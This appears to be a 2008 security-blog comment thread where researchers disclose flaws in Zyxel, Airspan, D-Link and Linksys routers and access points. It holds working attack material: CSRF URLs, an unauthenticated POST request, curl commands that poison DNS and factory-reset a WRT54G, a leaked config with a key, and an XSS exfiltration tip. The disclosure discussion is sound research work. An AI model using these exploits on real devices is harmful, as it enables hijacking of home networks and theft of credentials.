+<p><a href="http://pastebin.com/m5ad456b3" rel="nofollow">http://pastebin.com/m5ad456b3</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-mario even thread-even depth-1" id="comment-111474">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/e53f5d616931bfe8fa74bfd9f72e049e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/mario.html' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111474">
+			February 7, 2008 at 9:50 pm</a>		</div>
+
+		<p>@Adrian: The Snom phone can be configured to listen on a domain &#8211; but won&#8217;t by default.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111548">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0a2a878095814a2a79a78fbbfc86ba47?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">tokumei</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111548">
+			February 8, 2008 at 4:41 am</a>		</div>
+
+		<p>A little hint for those of you who don&#8217;t know where to start.. Try running a thorough Nessus scan, once from inside your private network and once from the outside and see what you get.</p>
+<p>Usually the results are shocking..</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-111638">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/89886495b27cfdc78593e1f5c8810594?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://php-ids.org/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111638">
+			February 8, 2008 at 10:09 am</a>		</div>
+
+		<p>@tokumei:</p>
+<p><code>nmap -sP 192.168.0.0/24</code> also does the job and won&#8217;t take as long a nessus scan ;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-111776">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-111776">
+			February 8, 2008 at 6:09 pm</a>		</div>
+
+		<p>Nothing as fast as ARP scans when you are inside the LAN.</p>
+<p>My favorite nmap arp scan command: <code>nmap -n -T5 -sP -PR 192.168.0.0/24</code></p>
+<p>In Cain: Sniffer/Hosts/(Right-click) Scan MAC Addresses</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-mario even thread-even depth-1" id="comment-113053">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/e53f5d616931bfe8fa74bfd9f72e049e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/mario.html' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113053">
+			February 11, 2008 at 12:35 pm</a>		</div>
+
+		<p>@Adrian: Indeed &#8211; twice as fast. Nice!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-113071">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/37b0f7cf8ccf81abfff68beb1ea54c3e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Kender</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113071">
+			February 11, 2008 at 1:15 pm</a>		</div>
+
+		<pre><code>Device: Zyxel P-2602HW-D1A
+Description: All-in-one ADSL2+ VoIP IAD for SOHO
+Firmware: V3.40(AJZ.1)
+Default IP: 192.168.1.254
+
+Once you log in your IP is whitelisted for 5 minutes (default value, see below).
+
+There is no CSRF protection.Examples:
+
+http&#58;//192.168.1.254/Forms/RemMagWWW_1?serverWebPort=80&amp;WWWAccessInterface=00000000
+
+will open up the admin web interface to the internet.
+
+http&#58;//192.168.1.254/Forms/rpSysAdmin_1?StdioTimout=0
+
+will set the IP whitelisting timeout to unlimited.
+
+When someone is logged in to the interface, requesting an admin url from a different IP in the LAN produces a
+message stating that the object is Protected. When no-one is logged in you get the login page. Thus it is possible
+to tell when someone is logged in.
+
+Protection:
+- Set the Maintenance &gt; System &gt; General &gt; Administrator Inactivity Timer very low.
+- Make sure you do not access any web resource while administering the device and for x minutes afterwards.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-113074">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113074">
+			February 11, 2008 at 1:19 pm</a>		</div>
+
+		<p>Kender, 10x for submitting this finding.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-113188">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nexact</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113188">
+			February 11, 2008 at 5:14 pm</a>		</div>
+
+		<p>hello pdp,</p>
+<p>I found a way to bypass any authentication in one of   most used WiMax antenna made by Airspan, It&#8217;s possible to access it without configuring a specific iprange, so depending on how your wimax network is setuped, you may be able to access others antenna.</p>
+<p>may I post it right there or it&#8217;s not considered like a &#8216;router&#8217; ? :-)</p>
+<p>peace, nex.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-113192">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113192">
+			February 11, 2008 at 5:28 pm</a>		</div>
+
+		<p>nexact, absolutely. feel free to post that info :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-113686">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113686">
+			February 12, 2008 at 3:32 pm</a>		</div>
+
+		<p>@Kender &#8211; damnit, you mentioned one of the issues I&#8217;ve covered on a ZyXEL gateway hacking paper I&#8217;ve been working on for some time! :) Although I found the issue in particular on other models. It seems that there is a lot of source code reuse among many ZyXEL models.</p>
+<p>Keep the research coming guys!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-113721">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5df87b40193ad4365f6399456f16dd5e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">nexact</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113721">
+			February 12, 2008 at 5:08 pm</a>		</div>
+
+		<pre><code>Device: Airspan WiMax ProST
+Hardware Rev: 4.1
+Software Ver: 6.5.38.0
+Picture: <a href="http://tinyurl.com/32vloa" rel="nofollow">http://tinyurl.com/32vloa</a>
+VulnType: Authentication bypass
+
+There's not a lot of options to configure in this antenna but actually it's possible to "scrap" the antenna by
+sending a corrupted firmware or you could simply bind it to another WiMax base station.
+
+How to exploit it ?
+Pretty simple, once you successfully log into the administration panel, it popups a webpage with all settings
+and a POST forms. Each settings is then accessed by sending a POST request to /process_adv/.
+
+The problem is that /process_adv/* is not validating if an user is authenticated.. so an attacker can access
+any options by forging a POST request.
+
+I've used BurpProxy to find out this one, kinda easy.. Setup your IE proxy to localhost:8080 and run BurpProxy,
+make any type of http request to your antenna and change the request :
+
+POST /process_adv/ HTTP/1.1
+Host: 10.0.0.1
+Keep-Alive: 300
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+DialogText=&amp;Advanced=1
+
+I'm currently debugging the firmware to find out if password is stocked in cleartext in the EEPROM. and
+maybe.. there's a backdoor in it ? :-) Port 23 is open and it runs VxWorks.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-113726">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/37b0f7cf8ccf81abfff68beb1ea54c3e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Kender</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113726">
+			February 12, 2008 at 5:14 pm</a>		</div>
+
+		<p>Yeah, they almost all run ZyNOS. Stupid thing is that the RomPager embedded webserver they use does support basic auth. I&#8217;d like to dig in to the firmware as well, but can&#8217;t figure out how to load it in IDA :( The telnet interface is interesting as well, even has packet capture abilities.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-113895">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/741a18430f4529d9b615ade525df9cb7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kinqpinz.info/' rel='external nofollow' class='url'>meathive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-113895">
+			February 12, 2008 at 11:14 pm</a>		</div>
+
+		<pre><code>So with everybody poisoning DNS I may as well add another attack vector against the WRT54G! I've also added how to restore the factory defaults.
+
+############################################################################
+What:
+poison dns.
+dns 1 = 1.2.3.4
+dns 2 = 5.6.7.8
+dns 3 = 9.8.7.6
+
+Where:
+http&#58;//192.168.1.1/Basic.tri?dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en
+
+How:
+curl -d "dhcp_end=149&amp;oldMtu=1500&amp;oldLanSubnet=0&amp;OldWanMode=0&amp;SDHCP1=192&amp;SDHCP2=168&amp;SDHCP3=1&amp;SDHCP4=100&amp;EDHCP1=192&amp;EDHCP2=168&amp;EDHCP3=1&amp;EDHCP4=150&amp;pd=&amp;now_proto=dhcp&amp;old_domain=&amp;chg_lanip=192.168.1.1&amp;_daylight_time=1&amp;wan_proto=0&amp;router_name=WRT54G&amp;wan_hostname=&amp;wan_domain=&amp;mtu_enable=0&amp;lan_ipaddr_0=192&amp;lan_ipaddr_1=168&amp;lan_ipaddr_2=1&amp;lan_ipaddr_3=1&amp;lan_netmask=0&amp;lan_proto=Enable&amp;dhcp_start=100&amp;dhcp_num=50&amp;dhcp_lease=0&amp;dns0_0=1&amp;dns0_1=2&amp;dns0_2=3&amp;dns0_3=4&amp;dns1_0=5&amp;dns1_1=6&amp;dns1_2=7&amp;dns1_3=8&amp;dns2_0=9&amp;dns2_1=8&amp;dns2_2=7&amp;dns2_3=6&amp;wins_0=0&amp;wins_1=0&amp;wins_2=0&amp;wins_3=0&amp;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&amp;daylight_time=ON&amp;layout=en" http&#58;//192.168.1.1/Basic.tri
+############################################################################
+What:
+restore factory defaults.
+
+Where:
+http&#58;//192.168.1.1/factdefa.tri?FactoryDefaults=Yes&amp;layout=en
+
+How:
+curl -d "FactoryDefaults=Yes&amp;layout=en" http&#58;//192.168.1.1/factdefa.tri
+############################################################################</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-114617">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5b7bc69f8e5026e15aaf789df081d84b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.hackphreak.org/' rel='external nofollow' class='url'>diesl0w</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114617">
+			February 14, 2008 at 12:21 am</a>		</div>
+
+		<pre><code>There is a configuration disclosure on the D-Link DWL 2100AP that allows for the configuration to be downloaded via web browser.
+
+Making a regular request to any file with the .cfg as an extension: http&#58;///config.cfg
+
+This will give the AP's configuration including admin passwords, encrypted key, allowed MAC's, etc.
+
+Part of the configuration disclosed is below:
+
+# Copyright (c) 2002 Atheros Communications, Inc., All Rights Reserved
+# DO NOT EDIT -- This configuration file is automatically generated
+magic Ar52xxAP
+fwc: 154
+login admin
+DHCPServer
+Eth_Acl
+nameaddr 0.0.0.0
+domainsuffix
+IP_Addr 10.10.10.166
+IP_Mask 255.255.255.0
+Gateway_Addr 10.10.10.1
+RADIUSaddr
+RADIUSport 1812
+RADIUSsecret
+password ##EDITED##
+passphrase
+wlan1 passphrase ##EDITED##
+passphraseKey 00000000000000000000000000000000000000000000000000000000000000000000000000000000
+wlan1 passphraseKey 1b911ae850d9ce61053b0d03ca901f593a776fd514dfc31313506f419a998feadc6fad570a57e58f
+version 2
+rbcnt 86
+
+I disclosed a doc and video of this sometime last year so its not brand new but still interesting!</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-114705">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114705">
+			February 14, 2008 at 10:46 am</a>		</div>
+
+		<p>@desl0w &#8211; very nice auth bypass vulnerability. Perhaps it was reported longer ago than in 2007. These guys published the following advisory in 2006. The only difference in their advisory is that they make the request to the .cfg file under the &#8216;/cgi-bin/&#8217; directory:</p>
+<p><a href="http://www.intruders.org.br/adv0206en.html" rel="nofollow">http://www.intruders.org.br/adv0206en.html</a></p>
+<p>Nice find indeed! If you find a XSS, then you can steal that info even if the web console is only enabled on the LAN interface (rather than WAN), by having the victim user visit your evil page!</p>
+<p>Just make the XSS payload use the XHR() function to scrape &#8216;/blah.cfg&#8217; and send it to the attacker&#8217;s site.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-114725">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5b7bc69f8e5026e15aaf789df081d84b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">diesl0w</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114725">
+			February 14, 2008 at 4:40 pm</a>		</div>
+
+		<p>@Adrian Pastor &#8211; Very Nice! I never shined to much light on this but that is definitely an idea worth expressing. I have another ZyXel AP and Linksys Wifi Cam I have been playing with. I noticed the Linksys Cam has telnet open. Is this normal? I have never nmap&#8217;d a linksys product until yesterday and noticed it was open.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-114831">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114831">
+			February 15, 2008 at 7:14 pm</a>		</div>
+
+		<p>@diesl0w &#8211; some devices come with telnet on by default. i.e.: zyxel prestige gateways. IP cameras-wise I&#8217;ve played with Axis IP cameras, which although support telnet (you need to edit the &#8216;inittab&#8217; file), do not have it enabled by default.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-114843">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6d85cf7c8a72f9ca8967ce2c0b2555f1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://al1us.net/' rel='external nofollow' class='url'>al1us</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114843">
+			February 15, 2008 at 11:00 pm</a>		</div>
+
+		<p>I guess all the bugs in the WRT54G are known, but I have just tested this device myself. I have version 7.As it is with other routers, I can change all the device settings without password prompt using post requests.</p>
+<p><code>http&#58;//router_ip/Config.bin</code> has all the passwords and keys in a plain text but you have to be logged in to get that, since the router doesn&#8217;t allow GET requests without authorization.</p>
+<p>One more thing I have found out is that port 21 is open and whether you change the router password or not, the ftp password is always the same: admin and no login. There are some files like nvram.cfg that has the router settings (no passwords), one file with the list of all html pages, one ELF executable which I failed to disassemble &#8211; IDA crashes with the following error: &#8220;the processor module is prohibited by the key&#8221;, and few other files. Maybe somebody has more knowledge and can help me with disassembling it.</p>
+<p>I can also make DoS and force the router to restart if I login to ftp with very long username and password.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-114971">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d3cc3202c4ce52b5941ba7ed7b14f0e0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Gembox</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-114971">
+			February 17, 2008 at 2:36 am</a>		</div>
+
+		<p>I have a WRT54GS with firmware v1.52.0.</p>
+<p>I can send POST requests to *.tri but the settings won&#8217;t be changed.  Even though the settings are not modified, I get a Status OK &#8211; 200 after the POST request.</p>
+<p>I did some tests and so far you must have the Authorization header with the right value to successfully change the settings.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115295">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c8f8ba01b11dcbfda47518ba157f62aa?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kinqpinz.info/' rel='external nofollow' class='url'>meathive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115295">
+			February 21, 2008 at 7:14 am</a>		</div>
+
+		<p>I noticed the same thing on another WRT54G model without wifi&#8230;POST requests were similar but no changes succeeded. I also don&#8217;t have any of the CFG files al1us is talking about, making the attack avenue slim until some code injection is found.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-115404">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115404">
+			February 22, 2008 at 8:48 am</a>		</div>
+
+		<pre><code>Hi guys, the ZyXEL vulnerability research paper is out! 
+
+There are tons of goodies, including persistent XSS via SNMP madness, wardriving over the internet, password leaks via SNMP,
+auth replay attacks, privilege escalation, etc: <a href="http://www.procheckup.com/Hacking_ZyXEL_Gateways.pdf" rel="nofollow">http://www.procheckup.com/Hack.....teways.pdf</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-115414">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115414">
+			February 22, 2008 at 10:56 am</a>		</div>
+
+		<p>hey ap,</p>
+<p>can you post some details here so we keep a log of all these issues :) cheers</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-115430">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115430">
+			February 22, 2008 at 2:47 pm</a>		</div>
+
+		<p>@loftgaia &#8211; Googling for <code>/cgi-bin/setup_dns.exe</code> reveals that the exact same auth bypass was reported on a Philips router in Feb 2007: <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=371598" rel="nofollow">https://bugzilla.mozilla.org/show_bug.cgi?id=371598</a></p>
+<p>I guess both devices, even though they&#8217;re different brands, they&#8217;re sharing the same firmware?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115438">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/fe04e0442981ed3a7a51f812fe0108b0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">loftgaia</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115438">
+			February 22, 2008 at 5:09 pm</a>		</div>
+
+		<p>@Adrian -Dunno,anyway here&#8217;s the link to the firmware im using:<br />
+<a href="http://www.belkin.com/support/article/?lid=en&amp;pid=f5d7230-4&amp;aid=5027&amp;scid=0&amp;fid=3805&amp;fn=f5d7230-4v7_us_9.01.10.bin" rel="nofollow">http://www.belkin.com/support/......01.10.bin</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-115539">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115539">
+			February 24, 2008 at 9:09 pm</a>		</div>
+
+		<pre><code>OK. Here is the summary of the ZyXEL Prestige routers hacking paper:
+
+- persistent JS/HTML injection via SNMP (we thought this is quite cool and potentially a new attack)
+
+- read and write SNMP access enabled by default. btw, there are many ISPs other there that ship Prestige routers with SNMP enabled on WAN (internet visible)!
+
+- privilege escalation from 'user' to 'admin' is possible
+
+- it's possible to extract sensitive information via SNMP read access such as the username and password for the Dynamic DNS service (if such service is enabled of course)
+
+- admin password is MD5-hashed, however no challenge reponse. Therefore, authentication is vulnerable to replay attacks and password cracking (no SSL/TLS is supported by Prestige routers)
+
+- admin sessions can be hijacked, since the user's source IP address is used for authentication which can be trivially spoofed in LAN environments (i.e.: via shared proxy or changing static IP address)
+
+- sensitive data such as passwords, SNMP community strings and WEP keys travels in the clear
+
+We also show how some wireless ZyXEL Prestige gateways can be used as a wardriving tool by using the built-in "wlan scan" command!
+
+Finally, we discuss how attackers can use the owned gateway as a bouncing point to attack machines connected in the internal (LAN) network
+
+For more information, including a wardriving expect script, interesting SNMP OIDs and affected models see:
+
+<a href="http://www.procheckup.com/Hacking_ZyXEL_Gateways.pdf" rel="nofollow">http://www.procheckup.com/Hack.....teways.pdf</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-115540">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115540">
+			February 24, 2008 at 9:12 pm</a>		</div>
+
+		<p>btw guys, Kender has been working on a quite neat ZyXEL reverse engineering project. He wrote a tool that allows you to read the admin password from the config file (rom-0) in the clear, which is not possible by default. Sweet!</p>
+<p>I&#8217;m hoping we will post the details soon!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-115594">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115594">
+			February 25, 2008 at 5:37 pm</a>		</div>
+
+		<pre><code>Kender's ZyXEL config file reverse engineering work can be found here: <a href="http://www.mindmasters.nl/kender/zyxel/" rel="nofollow">http://www.mindmasters.nl/kender/zyxel/</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-115673">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c8f8ba01b11dcbfda47518ba157f62aa?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kinqpinz.info/' rel='external nofollow' class='url'>meathive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-115673">
+			February 26, 2008 at 12:41 pm</a>		</div>
+
+		<pre><code>A couple new things I've found inside the default configuration file, <a href="http://192.168.1.1/Config.bin" rel="nofollow">http://192.168.1.1/Config.bin</a>. The router uses a military NTP server,
+ntp2.usno.navy.mil, for synchronizing time. The device's virtual memory/file system info is located at /mem/pricf/0, which I'm still exploring. The only
+reference I've found in regards to /mem/pricf/0, by the way, is on a Korean site so it's still relatively new territory. By simply viewing the ASCII within
